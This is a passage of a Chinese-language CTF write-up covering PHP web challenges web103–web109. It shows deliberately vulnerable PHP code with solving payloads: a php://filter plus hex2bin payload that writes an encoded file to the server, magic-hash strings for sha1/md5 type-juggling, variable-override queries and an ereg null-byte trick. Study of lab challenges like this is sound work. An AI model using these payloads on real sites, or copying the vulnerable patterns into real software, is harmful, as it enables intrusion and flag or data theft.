variable\">$v3</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$str</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'Sorry'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'hacker'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p>比起上一关多了一个正则，但是不影响做题</p>\n<pre><code class=\"language-payload\">get：?v2=115044383959474e6864434171594473&amp;v3=php://filter/write=convert.base64-decode/resource=1.php\npost：v1=hex2bin\n</code></pre>\n<h2 id=\"web104\"><a class=\"anchor\" href=\"#web104\">#</a> web104</h2>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"flag.php\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'v1'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'v2'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token variable\">$v1</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'v1'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token variable\">$v2</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'v2'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">sha1</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$v1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">==</span><span class=\"token function\">sha1</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$v2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token variable\">$flag</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p>弱类型比较，找两个 sha1 后为数字加 e 开头的，这里</p>\n<figure class=\"highlight txt\"><figcaption data-lang=\"txt\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>10932435112: 0e07766915004133176347055865026311692244</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>aaroZmOk: 0e66507019969427134894567494305185566735</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>aaK1STfY: 0e76658526655756207688271159624026011393</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>aaO8zKZF: 0e89257456677279068558073954252716165668</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>aa3OFF9m: 0e36977786278517984959260394024281014729</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>0e1290633704: 0e19985187802402577070739524195726831799</pre></td></tr></table></figure><p>当然，简单一点可以直接用数组绕过</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230111104256845.png\" alt=\"image-20230111104256845\" /></p>\n<h2 id=\"web105\"><a class=\"anchor\" href=\"#web105\">#</a> web105</h2>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'flag.php'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token variable\">$error</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'你还想要flag嘛？'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token variable\">$suces</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'既然你想要那给你吧！'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">foreach</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span> <span class=\"token keyword\">as</span> <span class=\"token variable\">$key</span> <span class=\"token operator\">=></span> <span class=\"token variable\">$value</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$key</span><span class=\"token operator\">===</span><span class=\"token string single-quoted-string\">'error'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"what are you doing?!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token variable\">$$key</span><span class=\"token operator\">=</span><span class=\"token variable\">$$value</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">foreach</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span> <span class=\"token keyword\">as</span> <span class=\"token variable\">$key</span> <span class=\"token operator\">=></span> <span class=\"token variable\">$value</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$value</span><span class=\"token operator\">===</span><span class=\"token string single-quoted-string\">'flag'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"what are you doing?!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token variable\">$$key</span><span class=\"token operator\">=</span><span class=\"token variable\">$$value</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'flag'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">==</span><span class=\"token variable\">$flag</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$error</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"your are good\"</span><span class=\"token operator\">.</span><span class=\"token variable\">$flag</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"\\n\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$suces</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>你还想要flag嘛？</pre></td></tr></table></figure><p>这个题的关键在于两个下面的语句，实现变量覆盖</p>\n<pre><code class=\"language-php、\">$$key=$$value;\n</code></pre>\n<p>我们的目标 flag 在 $flag 中，想要获得中国 flag 我们要么到最后一步</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"your are good\"</span><span class=\"token operator\">.</span><span class=\"token variable\">$flag</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"\\n\"</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>因为有上面提到的哪个关键语句在，这里可以通过变量覆盖实现，于是 payload 的思路就是先用第一个 if 的 get 将 flag 的值赋值给 suces，再用第二个 if，将 suces 的值给 error，再通过下面的语句会将 error 输出</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'flag'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">==</span><span class=\"token variable\">$flag</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$error</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>所以 payload</p>\n<figure class=\"highlight url\"><figcaption data-lang=\"url\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token query\"><span class=\"token query-delimiter\">?</span><span class=\"token pair\"><span class=\"token key\">suces</span>=<span class=\"token value\">flag</span></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token path\">post</span>：error=suces</pre></td></tr></table></figure><h2 id=\"web106\"><a class=\"anchor\" href=\"#web106\">#</a> web106</h2>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"flag.php\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'v1'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'v2'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token variable\">$v1</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'v1'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token variable\">$v2</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'v2'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">sha1</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$v1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">==</span><span class=\"token function\">sha1</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$v2</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token variable\">$v1</span><span class=\"token operator\">!=</span><span class=\"token variable\">$v2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token variable\">$flag</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p>为啥不和 104 放一块呢？？？好多问号</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230111111704069.png\" alt=\"image-20230111111704069\" /></p>\n<h2 id=\"web107\"><a class=\"anchor\" href=\"#web107\">#</a> web107</h2>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"flag.php\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'v1'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token variable\">$v1</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'v1'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token variable\">$v3</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'v3'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>       <span class=\"token function\">parse_str</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$v1</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$v2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>       <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$v2</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'flag'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">==</span><span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$v3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>           <span class=\"token keyword\">echo</span> <span class=\"token variable\">$flag</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>       <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token punctuation\">&#125;</span></span></pre></td></tr></table></figure><p>parse_str () 函数把查询字符串解析到变量中。</p>\n<p>未设置 <em>array</em> 参数，则由该函数设置的变量将覆盖已存在的同名变量</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">parse_str</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"name=Bill&amp;age=60\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token variable\">$name</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"&lt;br>\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token variable\">$age</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>//Bill</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>//60</pre></td></tr></table></figure><p>设置了 array 参数</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">parse_str</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"name=Bill&amp;age=60\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$myArray</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">print_r</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$myArray</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>// Array ( [name] => Bill [age] => 60 )</pre></td></tr></table></figure><p>将 v3 的参 md5 后与 flag 相比较，下面提供一组 md 后 0e 开头的字符串</p>\n<figure class=\"highlight txt\"><figcaption data-lang=\"txt\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>QNKCDZO</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>0e830400451993494058024219903391</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>240610708</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>0e462097431906509019562988736854</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>s878926199a</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>0e545993274517709034328855841020</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>s155964671a</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>0e342768416822451524974117254469</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>s214587387a</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>0e848240448830537924465865611904</pre></td></tr></table></figure><p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230111144939145.png\" alt=\"image-20230111144939145\" /></p>\n<h2 id=\"web108\"><a class=\"anchor\" href=\"#web108\">#</a> web108</h2>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"flag.php\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">ereg</span> <span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"^[a-zA-Z]+$\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token operator\">===</span><span class=\"token constant boolean\">FALSE</span><span class=\"token punctuation\">)</span>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'error'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token comment\">// 只有 36d 的人才能看到 flag</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">intval</span><span class=\"token punctuation\">(</span><span class=\"token function\">strrev</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token operator\">==</span><span class=\"token number\">0x36d</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token keyword\">echo</span> <span class=\"token variable\">$flag</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p>首先还是介绍几个函数</p>\n<p><code>ereg()</code>  函数搜索由指定的字符串作为由模式指定的字符串，如果发现模式则返回 <code>true</code> ，否则返回 <code>false</code> 。搜索对于字母字符是区分大小写的。</p>\n<p><code>intval()</code>  函数用于获取变量的整数值。</p>\n<p><code>strrev()</code>  函数反转字符串。</p>\n<p>再这里 ereg 函数存在一个 00null 的截断</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230111173919413.png\" alt=\"image-20230111173919413\" /></p>\n<h2 id=\"web109\"><a class=\"anchor\" href=\"#web109\">#</a> web109</h2>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'v1'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'v2'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token variable\">$v1</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'v1'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token variable\">$v2</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'v2'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/[a-zA-Z]+/'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$v1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/[a-zA-Z]+/'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$v2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>            <span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"echo new <span class=\"token interpolation\"><span class=\"token variable\">$v1</span></span>(<span class=\"token interpolation\"><span class=\"token variable\">$v2</span></span>());\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token delimiter 